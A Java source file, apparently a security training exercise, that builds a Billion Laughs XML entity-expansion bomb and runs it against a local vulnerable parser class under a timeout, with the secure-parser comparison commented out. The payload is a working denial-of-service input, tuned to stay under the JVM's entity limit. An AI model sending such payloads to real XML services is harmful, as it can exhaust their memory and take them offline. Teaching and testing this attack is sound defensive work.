import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.concurrent.*;

public class BillionLaughsExploit {
    public static void main(String[] args) {
        System.out.println("=== Exercise 1-1: Billion Laughs Attack (Denial of Service) ===\n");

        // Step 1: Create a payload that is significant but stays under modern JVM 100k
        // limits.
        // lol3 with 46 repetitions â‰ˆ 97,336 nodes.
        String bomb = "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE lolz [\n" +
                " <!ENTITY lol \"lol\">\n" +
                " <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n"
                +
                " <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n"
                +
                " <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n"
                +
                "]>\n" +
                "<lolz>&lol3;</lolz>";

        System.out.println("Sending a small but exponentially expanding XML payload to the parsers...");
        System.out.println("The uncompressed size is small, but expansion leads to massive memory usage.");
        System.out.println();

        // Step 2: Test Vulnerable Parser
        System.out.println("[Step 1] Sending payload to VulnerableXmlParser...");
        try {
            VulnerableXmlParser vulnerableParser = new VulnerableXmlParser();
            runWithTimeout(() -> {
                try {
                    Document doc = vulnerableParser.parse(new ByteArrayInputStream(bomb.getBytes()));
                    System.out.println("[!] Vulnerable parser actually finished (payload fits in modern safety net).");
                } catch (Exception e) {
                    System.out.println("Vulnerable parser error: " + e.getMessage());
                }
            }, 5, TimeUnit.SECONDS);
        } catch (TimeoutException e) {
            System.out.println("[+] Vulnerable parser HANGED (as expected) due to entity expansion!");
        } catch (Exception e) {
            System.out.println("Vulnerable parser failed: " + e.getMessage());
        }

        System.out.println();

        // Step 3: Test Secure Parser
        /*
         * System.out.println("[Step 2] Sending payload to SecureXmlParser...");
         * try {
         * SecureXmlParser secureParser = new SecureXmlParser();
         * Document doc = secureParser.parse(new ByteArrayInputStream(bomb.getBytes()));
         * System.out.println("Secure parser finished? This should not happen if the
         * attack is blocked.");
         * } catch (Exception e) {
         * System.out.println("[+] Secure parser successfully blocked the attack: " +
         * e.getMessage());
         * }
         */
    }

    private static void runWithTimeout(Runnable runnable, long timeout, TimeUnit unit) throws Exception {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        Future<?> future = executor.submit(runnable);
        try {
            future.get(timeout, unit);
        } catch (TimeoutException e) {
            future.cancel(true);
            throw e;
        } finally {
            executor.shutdownNow();
        }
    }
}
